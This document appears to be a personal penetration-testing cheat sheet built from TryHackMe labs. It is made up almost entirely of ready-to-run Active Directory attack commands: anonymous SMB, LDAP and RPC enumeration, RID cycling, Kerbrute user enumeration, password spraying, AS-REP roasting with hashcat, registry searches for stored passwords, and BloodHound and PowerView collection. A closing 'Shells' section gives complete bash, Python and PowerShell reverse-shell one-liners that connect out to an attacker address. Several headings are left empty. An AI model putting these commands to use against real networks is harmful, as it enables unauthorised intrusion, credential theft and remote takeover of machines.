# Offsec-Playbook

## Active Directory
https://github.com/swisskyrepo/InternalAllTheThings/tree/main/docs/active-directory

## Active Directory Basic Enumeration

fping -agq 10.211.11.0/24

nmap -sn 10.211.11.0/24

// We can run a service version scan with these specific ports to help identify the DC:
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt

// If we were running a more exhaustive assessment or dealing with unfamiliar environments, starting with a full port scan ensures we don't miss critical services running on non-standard ports. We could use this command to scan for all open ports:
nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt

### Network Enumeration With SMB
 nmap -p 88,135,139,389,445,636 -sV -sC TARGET_IP
 #### Listing SMB Shares :Anonymous:
 smbclient -L //TARGET_IP -N
 smbmap -H TARGET_IP
 #### Accessing SMB Shares :Anonymous:
 smbclient //TARGET_IP/SHARE_NAME -N
 enum4linux -a TARGET_IP // enum4linux TARGET_IP

### Domain Enumeration
 #### LDAP Enumeration (Anonymous Bind)
  ldapsearch -x -H ldap://10.211.11.10 -s base 
 -x: Simple authentication, in our case, anonymous authentication.
 -H: Specifies the LDAP server.
 -s: Limits the query only to the base object and does not search subtrees or children.

// We can then query user information with this command:
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"

### RPC Enumeration (Null Sessions)
    If successful, we can enumerate users with: enumdomusers
####  RID Cycling
//In Active Directory, RID (Relative Identifier) ranges are used to assign unique identifiers to user and group objects. These RIDs are components of the Security Identifier (SID), which uniquely identifies each object within a domain. Certain RIDs are well-known and standardised.

500 is the Administrator account, 501 is the Guest account and 512-514 are for the following groups: Domain Admins, Domain users and Domain guests. User accounts typically start from RID 1000 onwards.

We can use enum4linux-ng to determine the RID range, or we can start with a known range, for example, 1000-1200, and increment if we get results.

If enumdomusers is restricted, we can manually try querying each individual user RID with this bash command:

    for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done


### Username Enumeration With Kerbrute
    ./kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt
    NB: users enumerated from rpc/enum4linux > users.txt


### Password Spraying
    Password Policy
Before we can start our attack, it is essential to understand our target's password policy. This will allow us to retrieve information about the minimum password length, complexity, and the number of failed attempts that will lock out an account.

rpcclient

We can use rpcclient via a null session to query the DC for the password policy:

rpcclient -U "" 10.211.11.10 -N

And then we can run the getdompwinfo command:

CrackMapExec

CrackMapExec is a well-known network service exploitation tool that we will use throughout this module. It allows us to perform enumeration, command execution, and post-exploitation attacks in Windows environments. It supports various network protocols, such as SMB, LDAP, RDP, and SSH. If anonymous access is permitted, we can retrieve the password policy without credentials with the following command:

crackmapexec smb 10.211.11.10 --pass-pol

nxc smb 10.211.11.10 --pass-pol

NB i prefer to use Netexec

crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt

nxc smb 10.211.11.20 -u users.txt -p passwords.txt

## AD: Authenticated Enumeration

###  AS-REP Roasting
    Rubeus.exe asreproast [Windows]

    Impacket’s GetNPUsers.py (Linux/Windows):: ./GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass

    Crack the Hash :: hashcat -m 18200 hashes.txt wordlist.txt NB: 18200 ASREP Hash mode
### Manuel Enumeration

    "whoami /all"

    "Privileges
Let’s list some high privileges that can be pivotal in planning your next steps. The most interesting privileges to check for are:

SeImpersonatePrivilege: As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.

SeAssignPrimaryTokenPrivilege: This privilege permits a process to assign the primary token of another user to a new process. It is used in conjunction with the SeImpersonatePrivilege privilege.

SeBackupPrivilege: This privilege lets users read any file on the system, ignoring file permissions. Consequently, attackers can use it to dump sensitive files like the SAM or SYSTEM hive.

SeRestorePrivilege: This privilege grants the ability to write to any file or registry key without adhering to the set file permissions. Hence, it can be abused to overwrite critical system files or registry settings.

SeDebugPrivilege: This privilege allows the account to attach a debugger to any process. As a result, the attacker can use this privilege to dump memory from LSASS and extract credentials or even inject malicious code into privileged processes.

In brief, whoami /all informs you of your current power, be it due to group memberships or due to privileges. It is essential to note your findings as this tells your starting point."

#### System and Domain enum
    hostname;
    systeminfo 
    set
#### Domain Users
    net user /domain
    net user daniel.turner /domain
#### Domain Groups
    net group /domain 
    net localgroup  
    net localgroup administrators 
#### Logged-on Users and Sessions
    query user, or quser for short, to list users logged on to a machine
    tasklist /v, net session, 
#### Identifying Service Accounts
    Search using wmic: wmic service get Name,StartName || PS Get-WmiObject Win32_Service | select Name, StartName
    Search Using SC: sc query state= all || sc query state= all | find "DHCP"
#### Watching the Environment and Registry
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v keyword
#### Installed Applications
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
#### Searching the Registry
    reg query HKLM /f "password" /t REG_SZ /s

### Enumeration With BloodHound
    Data Collection: 
                    SharpHound.exe: .\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
                    AzureHound.ps1:
                    SharpHound.ps1:
                    BloodHound.py:  bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip

### Enumeration With PowerShell’s ActiveDirectory and PowerView Modules
            - Import-Module ActiveDirectory
                -- Get-ADUser -Filter * 
                -- Get-ADUser -Identity Administrator -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet
                -- Get-ADGroup -Filter * | Select Name
                -- Get-ADDefaultDomainPasswordPolicy
            - Import-Module .\PowerView.ps1
                -- Get-DomainUser
                -- Get-DomainUser *admin*
                -- Get-DomainGroup "*admin*"
                -- Get-DomainComputer
                -- Get-DomainUser -AdminCount
                -- Get-DomainUser -SPN


 
## Windows Privilege Escalation


## Linux Privilege Escalation


## Shells

- Bash (Linux): bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'

- Python: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  
- PowerShell (Windows):
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

     



